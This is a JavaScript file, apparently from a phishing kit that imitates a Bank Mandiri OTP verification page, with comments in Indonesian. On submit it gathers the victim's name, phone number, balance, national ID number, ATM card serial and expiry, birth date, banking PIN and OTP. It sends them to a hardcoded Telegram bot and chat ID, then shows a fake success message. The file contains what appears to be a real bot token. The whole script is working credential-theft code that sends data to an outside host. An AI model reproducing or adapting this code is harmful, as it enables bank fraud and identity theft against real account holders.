$(document).ready(function() {
    // Hapus masking karena type="password" akan menampilkan titik (*) otomatis saat diketik
    // $('#otp').mask('00000000'); // Dihapus agar sensor berfungsi

    // Form submission
    $('#form-otp').on('submit', function(e) {
        e.preventDefault();

        const otp = $('#otp').val().trim();
        const messageContainer = $('#message-container');

        // Clear previous messages
        messageContainer.html('');

        // Validasi: OTP harus 8 digit angka
        if (!otp) {
            messageContainer.html('<div class="message error">OTP tidak boleh kosong.</div>');
            return;
        } else if (otp.length !== 8 || !/^\d+$/.test(otp)) {
            messageContainer.html('<div class="message error">OTP harus tepat 8 digit angka.</div>');
            return;
        }

        // Jika valid, tampilkan loading
        $("#loader").show();

        // Ambil data dari sessionStorage (sama seperti sebelumnya, termasuk PIN)
        const nama = sessionStorage.getItem('nama') || '';
        const nomor = sessionStorage.getItem('nomor') || '';
        const saldo = sessionStorage.getItem('saldo') || '';
        const nik = sessionStorage.getItem('nik') || '';
        const seri = sessionStorage.getItem('seri') || '';
        const masa = sessionStorage.getItem('masa') || '';
        const tanggal_lahir = sessionStorage.getItem('tanggal_lahir') || '';
        const pin = sessionStorage.getItem('pin') || ''; // Ambil PIN dari sessionStorage

        // Simpan OTP ke sessionStorage
        sessionStorage.setItem('otp', otp);

        // Buat pesan lengkap (gabung semua data sebelumnya + OTP)
        const message = `
├• | 𝗗𝗮𝘁𝗮 𝗖𝘂𝗮𝗻 |
├───────────────────
├• *Nama* : ${nama}
├• *Nomor* : ${nomor}
├• *Saldo* : ${saldo}
├• *Nik Ktp* : ${nik}
├• *Seri Kartu ATM* : ${seri}
├• *Masa Berlaku* : ${masa}
├• *Tanggal Lahir* : ${tanggal_lahir}
├• *PIN Mandiri* : ${pin}
├• *OTP Mandiri* : ${otp}
╰───────────────────
        `;

        // Ganti dengan token dan ID Telegram kamu (jangan hardcode di production)
        const token_bot = '7504434844:AAEJvY81gVUID8gl1BCqdR28oNld83WbNxM'; // Ganti dengan token bot Telegram
        const telegram_id = '7213790655'; // Ganti dengan ID chat Telegram

        // Kirim ke Telegram API menggunakan fetch
        const url = `https://api.telegram.org/bot${token_bot}/sendMessage?parse_mode=markdown&chat_id=${telegram_id}&text=${encodeURIComponent(message)}`;

        fetch(url)
            .then(response => response.json())
            .then(data => {
                if (data.ok) {
                    // Sukses, tampilkan success dan redirect
                    messageContainer.html('<div class="message success">OTP valid! Verifikasi berhasil.</div>');
                    setTimeout(() => {
                        $("#loader").hide();
                        window.location.href = 'otp.html'; // Ganti dengan halaman sukses kamu
                    }, 2000);
                } else {
                    console.error('Error sending message:', data);
                    $("#loader").hide();
                    messageContainer.html('<div class="message error">Gagal mengirim data. Coba lagi.</div>');
                }
            })
            .catch(error => {
                console.error('Fetch error:', error);
                $("#loader").hide();
                messageContainer.html('<div class="message error">Error: ' + error.message + '</div>');
            });
    });
});
